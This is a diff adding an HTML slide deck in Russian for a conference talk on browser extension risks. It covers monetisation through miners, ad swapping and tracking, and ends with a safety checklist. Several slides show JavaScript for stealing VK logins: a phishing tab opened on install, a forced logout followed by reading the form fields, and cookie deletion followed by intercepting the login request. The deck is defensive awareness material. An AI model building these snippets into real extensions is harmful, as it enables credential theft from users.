@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+    <title>Расширения для браузера: угроза или опасность?</title>
+
+    <link rel="stylesheet" href="dist/reset.css">
+    <link rel="stylesheet" href="dist/reveal.css">
+    <link rel="stylesheet" href="dist/theme/black.css" id="theme">
+
+    <!-- Theme used for syntax highlighted code -->
+    <link
+      rel="stylesheet"
+      href="plugin/highlight/atom-one-dark.css"
+      id="highlight-theme"
+    >
+  </head>
+  <body>
+    <div class="reveal">
+      <div class="slides">
+        <section>
+          <h1 class="r-fit-text">Расширения для браузера:</h1>
+          <h1 class="r-fit-text">угроза или опасность?</h1>
+        </section>
+        <section>
+          <h2>Али Гасымов</h2>
+          <blockquote>Первое расширение опубликовал в январе 2017 и понеслось...</blockquote>
+        </section>
+        <section
+          data-background-image="./images/savefrom.png"
+          data-background-size="contain"
+        ></section>
+        <section
+          data-background-image="./images/userjs-runner.png"
+          data-background-size="contain"
+        ></section>
+        <section
+          data-background-image="./images/vdp.png"
+          data-background-size="contain"
+        ></section>
+        <section
+          data-background-image="./images/wondertab.png"
+          data-background-size="contain"
+        ></section>
+        <section
+          data-background-image="./images/disco.png"
+          data-background-size="contain"
+        ></section>
+        <section
+          data-background-image="./images/ytt.png"
+          data-background-size="contain"
+        ></section>
+        <section
+          data-background-image="./images/ytf.png"
+          data-background-size="contain"
+        ></section>
+        <section
+          data-background-image="./images/rtl.png"
+          data-background-size="contain"
+        ></section>
+        <section>
+          <h2 class="r-fit-text">Сколько расширений у вас установлено?</h2>
+          <img src="./images/telegram-holy-qr.svg" width="320" height="320" alt="QR код для подключения к чату конференции в Телеграме">
+          <p>Telegram: @holyjsconf</p>
+        </section>
+        <section>
+          <h2>Как раcширения появляются у нас в браузере?</h2>
+        </section>
+        <section
+          data-background-image="./images/linkedin.png"
+          data-background-size="contain"
+        ></section>
+        <section
+          data-background-image="./images/search-vpn.png"
+          data-background-size="contain"
+        ></section>
+        <section
+          data-background-image="./images/linkedin-login.png"
+          data-background-size="contain"
+        ></section>
+        <section
+          data-background-image="./images/offers.jpg"
+          data-background-size="contain"
+        ></section>
+        <section>
+          <h2>Формула</h2>
+          <ul>
+            <li class="fragment">Проблема</li>
+            <li class="fragment">Устанавливаем расширение</li>
+            <li class="fragment">Проблему решили</li>
+            <li class="fragment">Про расширение забыли</li>
+          </ul>
+        </section>
+        <section
+          data-background-image="./images/disable-vpn.png"
+          data-background-size="contain"
+        ></section>
+        <section>
+          <h2>Что эти расширения делают?</h2>
+        </section>
+        <section>
+          <h2>Они на вас зарабатывают</h2>
+        </section>
+        <section>
+          <section
+            data-background-image="./images/articles.png"
+            data-background-size="contain"
+          ></section>
+        </section>
+        <section>
+          <h2>Как расширения зарабатывают?</h2>
+        </section>
+        <section>
+          <h2 class="r-fit-text">Как устроены расширения для браузеров?</h2>
+          <img
+            src="./images/australopithecus.png"
+            width="423"
+            height="448"
+            alt="Австралопитек"
+          >
+        </section>
+        <section>
+          <h2>Самый главный файл</h2>
+          <code class="fragment">manifest.json</code>
+          <pre class="fragment"><code data-trim data-line-numbers="1-5|2|3|4">
+{
+  "manifest_version": 2,
+  "name": "HolyJS 💖",
+  "version": "1.0.0"
+}
+          </code></pre>
+        </section>
+        <section
+          data-background-image="./images/manifest-demo.png"
+          data-background-position="top"
+        ></section>
+        <section>
+          <h2>Попап</h2>
+          <pre><code data-trim data-line-numbers="1-5|3">
+{
+  "browser_action": {
+    "default_popup": "popup.html"
+  }
+}
+          </code></pre>
+        </section>
+        <section
+          data-background-image="./images/disable-vpn.png"
+          data-background-size="contain"
+        ></section>
+        <section>
+          <h2 class="r-fit-text">Если выключить расширение через попап, то оно на самом деле выключится?</h2>
+          <img src="./images/telegram-holy-qr.svg" width="320" height="320" alt="QR код для подключения к чату конференции в Телеграме">
+          <p>Telegram: @holyjsconf</p>
+        </section>
+        <section
+          data-background-image="./images/popup-cat.png"
+          data-background-size="contain"
+        ></section>
+        <section
+          data-background-image="./images/popup-cat-coins.png"
+          data-background-size="contain"
+        ></section>
+        <section>
+          <h2>Контент скрипты</h2>
+          <pre><code data-trim data-line-numbers="1-6|3|4">
+{
+  "content_scripts": [{
+    "matches": ["https://vk.com/*"],
+    "js": ["js/content.js"]
+  }]
+}
+          </code></pre>
+        </section>
+        <section>
+          <h2>Контент скрипты</h2>
+          <ul>
+            <li class="fragment">DOM</li>
+            <li class="fragment">Listeners</li>
+            <li class="fragment">Events</li>
+            <li class="fragment">Other environment</li>
+          </ul>
+        </section>
+        <section
+          data-background-image="./images/content-scripts-demo.png"
+          data-background-size="contain"
+        ></section>
+        <section>
+          <h2>Бэкграунд</h2>
+          <pre><code data-trim data-line-numbers="1-5|3">
+{
+  "background": {
+    "scripts": ["js/background.js"]
+  }
+}
+          </code></pre>
+        </section>
+        <section>
+          <img class="r-stretch" src="./images/background-messages.svg" alt="Схема обмена сообщений">
+        </section>
+        <section>
+          <pre class="r-stretch"><code class="language-js" data-trim data-line-numbers="1-16|1-8|2|3|4|6|10-16|11-14|12-13|14-16|15">
+// background.js
+browser.runtime.onMessage.addListener(async (message) => {
+  if (message.type === 'track') {
+    const result = await track(message.payload);
+
+    return result;
+  }
+});
+
+// content.js
+browser.runtime.sendMessage({
+  type: 'track',
+  payload: { /* event data */}
+}).then((response) => {
+  console.log(response); // 'success'
+});
+          </code></pre>
+        </section>
+        <section>
+          <h2>Пермишены</h2>
+          <p>Их больше 50. Здесь самые интересные</p>
+          <pre><code data-trim data-line-numbers="1-13|3-4|5|6|7|8|9|10">
+{
+  "permissions": [
+    "http://*/*",
+    "https://*/*",
+    "tabs",
+    "history",
+    "cookies",
+    "webRequest",
+    "management",
+    "notifications"
+  ]
+}
+          </code></pre>
+        </section>
+        <section
+          data-background-image="./images/permissions-demo.png"
+          data-background-position="top"
+        ></section>
+        <section>
+          <h2>Пермишены grammarly</h2>
+          <ol>
+            <li class="fragment">http://*/*</li>
+            <li class="fragment">https://*/*</li>
+            <li class="fragment">tabs</li>
+            <li class="fragment">notifications</li>
+            <li class="fragment">storage</li>
+            <li class="fragment">Какой ещё пермишен у grammarly?</li>
+          </ol>
+        </section>
+        <section>
+          <h2 class="r-fit-text">Какой ещё пермишен у grammarly?</h2>
+          <img src="./images/telegram-holy-qr.svg" width="320" height="320" alt="QR код для подключения к чату конференции в Телеграме">
+          <p>Telegram: @holyjsconf</p>
+        </section>
+        <section>
+          <h2 class="r-fit-text">Что можно делать?</h2>
+          <ul>
+            <li class="fragment">Открывать табы</li>
+            <li class="fragment">Нажимать на кнопки</li>
+            <li class="fragment">Просматривать все запросы</li>
+            <li class="fragment">Менять страницу как угодно</li>
+            <li class="fragment">Отправлять запросы куда угодно</li>
+            <li class="fragment">Отслеживать действия пользователя</li>
+          </ul>
+        </section>
+        <section>
+          <h2 class="r-fit-text">Интеграции</h2>
+          <h2 class="r-fit-text fragment">Что это такое?</h2>
+        </section>
+        <section>
+          <h2 class="r-fit-text">Откуда берутся интеграции?</h2>
+          <ol>
+            <li class="fragment">Разработчик вставляет интеграцию</li>
+            <li class="fragment">Расширение покупают</li>
+          </ol>
+        </section>
+        <section>
+          <h2 class="r-fit-text">Какие интеграции бывают?</h2>
+        </section>
+        <section>
+          <h2>Майнеры</h2>
+          <img src="./images/mining.png" alt="График с загрузкой процессора">
+        </section>
+        <section
+          data-background-image="./images/alitools.png"
+          data-background-position="bottom left"
+        ></section>
+        <section
+          data-background-image="./images/link-substitution.png"
+          data-background-size="contain"
+        ></section>
+        <section
+          data-background-image="./images/youtube-embed.png"
+          data-background-size="contain"
+        ></section>
+        <section
+          data-background-image="./images/sovetnik.png"
+          data-background-position="center"
+          data-background-size="contain"
+        ></section>
+        <section
+          data-background-image="./images/seo.png"
+          data-background-position="center"
+        ></section>
+        <section>
+          <h2>Подмена рекламы</h2>
+        </section>
+        <section>
+          <h2>Сбор анонимной аналитики</h2>
+          <pre class="fragment"><code data-trim data-line-numbers="2|3-6">
+{
+  "cid": "513e6969-8fa9-40af-987a-7b6726523e47",
+  "event_type": "open_url",
+  "event_payload": {
+    "url": "https://www.google.com/"
+  }
+}
+          </code></pre>
+        </section>
+        <section
+          data-background-color="#fff"
+          data-background-image="./images/jacque-fresco.jpeg"
+          data-background-size="unset"
+          data-background-position="bottom right"
+        >
+          <blockquote>Что можно узнать из анонимной аналитики?</blockquote>
+        </section>
+        <section>
+          <h2>Личность (:</h2>
+          <ul class="fragment">
+            <li>https://example.com/<span class="fragment highlight-blue">me/123456</span></li>
+            <li>https://app.netlify.com/teams/<span class="fragment highlight-green">alik0211</span>/overview</li>
+            <li>https://<span class="fragment highlight-green">holyjs</span>.atlassian.net/jira/projects</li>
+            <li>https://www.notion.so/<span class="fragment highlight-green">holyjs</span>/marketing</li>
+          </ul>
+        </section>
+        <section>
+          <h2>Город</h2>
+          <ul class="fragment" data-fragment-index="1">
+            <li>https://dodopizza.ru/<span class="fragment highlight-blue" data-fragment-index="2">krasnodar</span>/krasnaya83</li>
+            <li>https://www.delivery-club.ru/<span class="fragment highlight-blue" data-fragment-index="2">krasnodar</span></li>
+            <li>https://eda.yandex.ru/<span class="fragment highlight-blue" data-fragment-index="2">krasnodar</span></li>
+          </ul>
+        </section>
+        <section>
+          <h2>Поисковые запросы</h2>
+          <ul class="fragment" data-fragment-index="1">
+            <li>https://yandex.ru/search/?text=<span class="fragment highlight-blue" data-fragment-index="2">holyjs</span></li>
+            <li>https://www.google.com/search?q=<span class="fragment highlight-blue" data-fragment-index="2">holyjs</span></li>
+          </ul>
+        </section>
+        <section>
+          <h2>И с кем переписывается</h2>
+          <ul class="fragment" data-fragment-index="1">
+            <li>https://ok.ru/messages/<span class="fragment highlight-blue" data-fragment-index="2">573044180539</span></li>
+            <li>https://vk.com/im?sel=<span class="fragment highlight-blue" data-fragment-index="2">304062978</span></li>
+          </ul>
+        </section>
+        <section>
+          <h2>Продажа данных</h2>
+        </section>
+        <section
+          data-background-image="./images/dolphin.jpg"
+          data-background-size="contain"
+          data-background-position="center"
+        ></section>
+        <section
+          data-background-image="./images/swiper.png"
+          data-background-size="10%"
+          data-background-position="bottom -85px center"
+        >
+          <h2 class="fragment">Воруем логин и пароль</h2>
+          <p class="fragment">На примере социальной сети ВКонтакте</p>
+        </section>
+        <section>
+          <h2>Вариант 1</h2>
+          <pre><code class="language-js" data-trim data-line-numbers="1-8|1|2|3-7|4-6">
+// background.js
+browser.runtime.onInstalled.addListener(({ reason }) => {
+  if (reason === 'install') {
+    browser.tabs.create({
+      url: 'https://vkontakti.com/',
+    });
+  }
+});
+          </code></pre>
+        </section>
+        <section
+          data-background-image="./images/fake-vk.png"
+          data-background-size="contain"
+        ></section>
+        <section>
+          <h2>Вариант 2</h2>
+          <pre class="r-stretch"><code class="language-js" data-trim data-line-numbers="1-22|1|2-9|11-22">
+// content.js
+// 1. Логаут
+const logoutButton = document.getElementById(
+  "top_logout_link"
+);
+
+if (logoutButton) {
+  logoutButton.click();
+}
+
+// 2. Обработка отправки формы
+const formElement =
+  document.getElementById("index_login_form");
+
+if (formElement) {
+  formElement.onsubmit = () => {
+    const login =
+      document.getElementById("index_email").value;
+    const password =
+      document.getElementById("index_pass").value;
+  };
+}
+          </code></pre>
+        </section>
+        <section>
+          <h2>Можно сделать лучше?</h2>
+        </section>
+        <section>
+          <img data-fragment-index="0" src="./images/cookies.jpg" alt="Куки" width="800" height="600">
+        </section>
+        <section>
+          <h2>Вариант 3</h2>
+          <pre class="r-stretch" data-fragment-index="0"><code class="language-js" data-trim data-line-numbers="1-30|4-7|8-15|19-30|28|24">
+// 1. Логаут через очистку кук
+browser.runtime.onInstalled.addListener(({ reason }) => {
+  if (reason === 'install') {
+    browser.cookies
+      .getAll({
+        domain: 'vk.com',
+      })
+      .then((cookies) => {
+        cookies.forEach((cookie) => {
+          browser.cookies.remove({
+            name: cookie.name,
+            url: 'https://vk.com/',
+          });
+        });
+      });
+  }
+});
+
+// 2. Перехват запроса на авторизвацию
+browser.webRequest.onBeforeRequest.addListener(
+  (details) => {
+    const { requestBody = {} } = details;
+    const { formData = {} } = requestBody;
+    const { email, pass } = formData;
+
+    return { cancel: false };
+  },
+  { urls: ['https://login.vk.com/?act=login'] },
+  ['requestBody']
+);
+          </code></pre>
+        </section>
+        <section
+          data-background-image="./images/dora-github.png"
+          data-background-position="top"
+        ></section>
+        <section>
+          <blockquote>Единственное, чего стоит бояться на этой планете, — это расширения для браузера.</blockquote>
+          <p>— Карл Густав Юнг, швейцарский психолог и психиатр</p>
+        </section>
+        <section>
+          <blockquote>Остановись пока остановка не стала последней!</blockquote>
+        </section>
+        <section>
+          <h2 class="r-fit-text">Отдельный профиль в хроме</h2>
+        </section>
+        <section
+          data-background-image="./images/profiles.png"
+          data-background-size="contain"
+        ></section>
+        <section
+          data-background-image="./images/profiles-create.png"
+          data-background-size="contain"
+        ></section>
+        <section>
+          <img class="r-stretch" src="./images/firefox.png" alt="Фаерфокс">
+        </section>
+        <section>
+          <h2>Чек-лист</h2>
+          <ul>
+            <li class="fragment highlight-green">Пройтись по настройкам расширений</li>
+            <li>Включить 2FA</li>
+            <li>Сбросить сессии в сервисах</li>
+            <li>Разные пароли для разных аккаунтов</li>
+            <li>Менеджер паролей</li>
+            <li>Проверяйте домены сайтов</li>
+          </ul>
+        </section>
+        <section>
+          <img class="r-stretch" src="./images/checklist.png" alt="Чеклист">
+        </section>
+        <section
+          data-background-image="./images/final.png"
+          data-background-position="bottom"
+        ></section>
+      </div>
+    </div>
+
+    <script src="dist/reveal.js"></script>
+    <script src="plugin/notes/notes.js"></script>
+    <script src="plugin/markdown/markdown.js"></script>
+    <script src="plugin/highlight/highlight.js"></script>
+    <script>
+      // More info about initialization & config:
+      // - https://revealjs.com/initialization/
+      // - https://revealjs.com/config/
+      Reveal.initialize({
+        hash: true,
+
+        // Learn about plugins: https://revealjs.com/plugins/
+        plugins: [RevealMarkdown, RevealHighlight, RevealNotes],
+      });
+    </script>
+  </body>
+</html>
